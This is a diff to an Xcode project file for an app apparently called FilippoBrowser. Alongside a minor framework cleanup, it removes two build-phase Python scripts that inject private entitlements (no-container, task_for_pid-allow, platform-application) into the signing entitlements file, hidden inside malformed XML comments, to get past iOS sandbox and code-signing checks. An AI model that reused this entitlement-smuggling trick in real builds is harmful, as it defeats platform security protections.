@@ -96,7 +96,6 @@
 
 /* Begin PBXFileReference section */
 		0B1E54F6245B2EDD00419AB7 /* TODO.md */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = net.daringfireball.markdown; path = TODO.md; sourceTree = "<group>"; };
-		0B477F082397DF69000400CD /* FLEX.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; path = FLEX.framework; sourceTree = "<group>"; };
 		0B4BED83233531D9005E5BB1 /* FilippoBrowser WatchKit App.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "FilippoBrowser WatchKit App.app"; sourceTree = BUILT_PRODUCTS_DIR; };
 		0B4BED89233531D9005E5BB1 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Interface.storyboard; sourceTree = "<group>"; };
 		0B4BED8B233531DA005E5BB1 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
@@ -207,7 +206,6 @@
 			isa = PBXGroup;
 			children = (
 				0B671726242BB81C00311160 /* FLEX.framework */,
-				0B477F082397DF69000400CD /* FLEX.framework */,
 			);
 			name = Frameworks;
 			sourceTree = "<group>";
@@ -280,7 +278,6 @@
 				0B4BED81233531D9005E5BB1 /* Resources */,
 				0B4BEDAA233531DA005E5BB1 /* Embed App Extensions */,
 				0BBC8B7A2349D7FF007A6EFB /* Frameworks */,
-				0B502475245C64B500A069FF /* ShellScript */,
 			);
 			buildRules = (
 			);
@@ -300,7 +297,6 @@
 				0B4BED8F233531DA005E5BB1 /* Frameworks */,
 				0B4BED90233531DA005E5BB1 /* Resources */,
 				0BF68E4E2396CDA100A191BA /* Embed Frameworks */,
-				0B502476245C64BD00A069FF /* ShellScript */,
 			);
 			buildRules = (
 			);
@@ -433,43 +429,6 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
-
-/* Begin PBXShellScriptBuildPhase section */
-		0B502475245C64B500A069FF /* ShellScript */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /usr/bin/python;
-			shellScript = "# Type a script or drag a script file from your workspace to insert its path.\nimport os\n# preinstalled python is python2\nfilename = '/'.join(map(os.environ.get, ('TARGET_TEMP_DIR', 'FULL_PRODUCT_NAME'))) + '.xcent'\n\nevil = '''\n    <!---><!-->\n    <key>platform-application</key>\n    <true/>\n    <key>com.apple.private.security.no-container</key>\n    <true/>\n    <key>task_for_pid-allow</key>\n    <true/>\n    <!-- -->\n'''\nwith open(filename, 'r') as fp:\n  buf = fp.read()\ncursor = buf.rfind('</dict>')\noutput = buf[0:cursor] + evil + buf[cursor:]\nwith open(filename, 'w') as fp:\n  fp.write(output)\n";
-		};
-		0B502476245C64BD00A069FF /* ShellScript */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /usr/bin/python;
-			shellScript = "# Type a script or drag a script file from your workspace to insert its path.\nimport os\n# preinstalled python is python2\nfilename = '/'.join(map(os.environ.get, ('TARGET_TEMP_DIR', 'FULL_PRODUCT_NAME'))) + '.xcent'\n\nevil = '''\n    <!---><!-->\n    <key>platform-application</key>\n    <true/>\n    <key>com.apple.private.security.no-container</key>\n    <true/>\n    <key>task_for_pid-allow</key>\n    <true/>\n    <!-- -->\n'''\nwith open(filename, 'r') as fp:\n  buf = fp.read()\ncursor = buf.rfind('</dict>')\noutput = buf[0:cursor] + evil + buf[cursor:]\nwith open(filename, 'w') as fp:\n  fp.write(output)\n";
-		};
-/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		0B4BED8E233531DA005E5BB1 /* Sources */ = {
